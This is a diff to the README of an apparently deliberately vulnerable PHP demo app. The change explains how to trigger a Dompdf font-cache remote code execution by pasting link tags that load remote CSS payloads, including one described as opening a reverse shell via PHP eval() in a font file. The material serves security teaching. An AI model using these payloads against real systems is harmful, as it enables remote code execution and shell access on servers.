@@ -79,8 +79,15 @@ Dompdf loads the style sheet and saves the custom font type to the dompdf font c
 
 *** Note: in the CSS font-family, the font name needs to match the actual font name or this will not work. 
 
-To use this in this app, load the below code into a todo item and click pdf on its line entry
+To use this in this app, load the below code into a todo item and click pdf on its line entry, chicken and egg note that you will need to refresh the PDF with the file examples below so that the link generates into the pdf to click. 
 
 ```
 <link rel=stylesheet href='https://raw.githubusercontent.com/snyk-labs/php-goof/main/exploits/gotcha.css'>
+```
+Additional, added an example that uses a reverse shell by using a php `eval()` in a font file leveraging the RCE exploit. This works the same as above but using the following CSS.
+
+Note this uses a different font file and family in the exploit folder.
+
+```
+<link rel=stylesheet href='https://raw.githubusercontent.com/snyk-labs/php-goof/main/exploits/rshell.css'>
 ```
